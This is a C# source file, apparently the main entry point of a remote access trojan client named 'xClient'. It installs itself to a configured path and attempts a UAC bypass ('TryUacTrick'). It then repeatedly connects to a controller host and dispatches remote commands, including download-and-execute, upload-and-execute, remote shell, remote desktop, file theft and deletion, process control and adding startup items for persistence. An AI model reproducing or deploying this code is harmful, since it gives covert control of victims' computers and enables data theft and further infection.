using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core;
using xClient.Core.Commands;
using xClient.Core.Packets;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using Directory = xClient.Core.Packets.ServerPackets.Directory;

namespace xClient
{
    internal static class Program
    {
        public static Client ConnectClient;
        private static bool _reconnect = true;
        private static volatile bool _connected;
        private static Mutex _appMutex;

        [STAThread]
        private static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Settings.Initialize();
            Initialize();
            if (!SystemCore.Disconnect)
                Connect();

            Cleanup();
        }

        private static void Cleanup()
        {
            CommandHandler.CloseShell();
            if (CommandHandler.LastDesktopScreenshot != null)
                CommandHandler.LastDesktopScreenshot.Dispose();
            if (_appMutex != null)
                _appMutex.Close();

            CommandHandler.StreamCodec = null;
        }

        private static void InitializeClient()
        {
            ConnectClient = new Client();

            ConnectClient.AddTypesToSerializer(typeof (IPacket), typeof (InitializeCommand), typeof (Disconnect),
                typeof (Reconnect), typeof (Uninstall), typeof (DownloadAndExecute), typeof (UploadAndExecute),
                typeof (Desktop), typeof (GetProcesses), typeof (KillProcess), typeof (StartProcess), typeof (Drives),
                typeof (Directory), typeof (DownloadFile), typeof (MouseClick), typeof (GetSystemInfo),
                typeof (VisitWebsite), typeof (ShowMessageBox), typeof (Update), typeof (Monitors),
                typeof (ShellCommand), typeof (Rename), typeof (Delete), typeof (Action), typeof (GetStartupItems),
                typeof (AddStartupItem), typeof (DownloadFileCanceled), typeof (Initialize), typeof (Status),
                typeof (UserStatus), typeof (DesktopResponse), typeof (GetProcessesResponse), typeof (DrivesResponse),
                typeof (DirectoryResponse), typeof (DownloadFileResponse), typeof (GetSystemInfoResponse),
                typeof (MonitorsResponse), typeof (ShellCommandResponse), typeof (GetStartupItemsResponse));

            ConnectClient.ClientState += ClientState;
            ConnectClient.ClientRead += ClientRead;
        }

        private static void Initialize()
        {
            Thread.Sleep(2000);

            SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
            SystemCore.MyPath = Application.ExecutablePath;
            SystemCore.InstallPath = Path.Combine(Settings.DIR, Settings.SUBFOLDER + @"\" + Settings.INSTALLNAME);
            SystemCore.AccountType = SystemCore.GetAccountType();
            SystemCore.InitializeGeoIp();

            if (Settings.ENABLEUACESCALATION)
            {
                if (SystemCore.TryUacTrick())
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;
            }

            if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
            {
                if (!SystemCore.CreateMutex(out _appMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                new Thread(SystemCore.UserIdleThread).Start();

                InitializeClient();
            }
            else
            {
                if (!SystemCore.CreateMutex(out _appMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                SystemCore.Install();
            }
        }

        private static void Connect()
        {
            TryAgain:
            Thread.Sleep(250 + new Random().Next(0, 250));

            if (!_connected)
                ConnectClient.Connect(Settings.HOST, Settings.PORT);

            Thread.Sleep(200);

            Application.DoEvents();

            HoldOpen:
            while (_connected) // hold client open
            {
                Application.DoEvents();
                Thread.Sleep(2500);
            }

            Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));

            if (SystemCore.Disconnect)
            {
                ConnectClient.Disconnect();
                return;
            }

            if (_reconnect && !SystemCore.Disconnect && !_connected)
                goto TryAgain;
            goto HoldOpen;
        }

        private static void ClientState(Client client, bool connected)
        {
            _connected = connected;

            if (connected && !SystemCore.Disconnect)
                _reconnect = true;
            else if (!connected && SystemCore.Disconnect)
                _reconnect = false;
            else
                _reconnect = !SystemCore.Disconnect;
        }

        private static void ClientRead(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (type == typeof (InitializeCommand))
            {
                CommandHandler.HandleInitializeCommand((InitializeCommand) packet, client);
            }
            else if (type == typeof (DownloadAndExecute))
            {
                CommandHandler.HandleDownloadAndExecuteCommand((DownloadAndExecute) packet, client);
            }
            else if (type == typeof (UploadAndExecute))
            {
                CommandHandler.HandleUploadAndExecute((UploadAndExecute) packet, client);
            }
            else if (type == typeof (Disconnect))
            {
                CommandHandler.CloseShell();
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
            else if (type == typeof (Reconnect))
            {
                CommandHandler.CloseShell();
                client.Disconnect();
            }
            else if (type == typeof (Uninstall))
            {
                CommandHandler.HandleUninstall((Uninstall) packet, client);
            }
            else if (type == typeof (Desktop))
            {
                CommandHandler.HandleRemoteDesktop((Desktop) packet, client);
            }
            else if (type == typeof (GetProcesses))
            {
                CommandHandler.HandleGetProcesses((GetProcesses) packet, client);
            }
            else if (type == typeof (KillProcess))
            {
                CommandHandler.HandleKillProcess((KillProcess) packet, client);
            }
            else if (type == typeof (StartProcess))
            {
                CommandHandler.HandleStartProcess((StartProcess) packet, client);
            }
            else if (type == typeof (Drives))
            {
                CommandHandler.HandleDrives((Drives) packet, client);
            }
            else if (type == typeof (Directory))
            {
                CommandHandler.HandleDirectory((Directory) packet, client);
            }
            else if (type == typeof (DownloadFile))
            {
                CommandHandler.HandleDownloadFile((DownloadFile) packet, client);
            }
            else if (type == typeof (MouseClick))
            {
                CommandHandler.HandleMouseClick((MouseClick) packet, client);
            }
            else if (type == typeof (GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((GetSystemInfo) packet, client);
            }
            else if (type == typeof (VisitWebsite))
            {
                CommandHandler.HandleVisitWebsite((VisitWebsite) packet, client);
            }
            else if (type == typeof (ShowMessageBox))
            {
                CommandHandler.HandleShowMessageBox((ShowMessageBox) packet, client);
            }
            else if (type == typeof (Update))
            {
                CommandHandler.HandleUpdate((Update) packet, client);
            }
            else if (type == typeof (Monitors))
            {
                CommandHandler.HandleMonitors((Monitors) packet, client);
            }
            else if (type == typeof (ShellCommand))
            {
                CommandHandler.HandleShellCommand((ShellCommand) packet, client);
            }
            else if (type == typeof (Rename))
            {
                CommandHandler.HandleRename((Rename) packet, client);
            }
            else if (type == typeof (Delete))
            {
                CommandHandler.HandleDelete((Delete) packet, client);
            }
            else if (type == typeof (Action))
            {
                CommandHandler.HandleAction((Action) packet, client);
            }
            else if (type == typeof (GetStartupItems))
            {
                CommandHandler.HandleGetStartupItems((GetStartupItems) packet, client);
            }
            else if (type == typeof (AddStartupItem))
            {
                CommandHandler.HandleAddStartupItem((AddStartupItem) packet, client);
            }
            else if (type == typeof (DownloadFileCanceled))
            {
                CommandHandler.HandleDownloadFileCanceled((DownloadFileCanceled) packet, client);
            }
        }
    }
}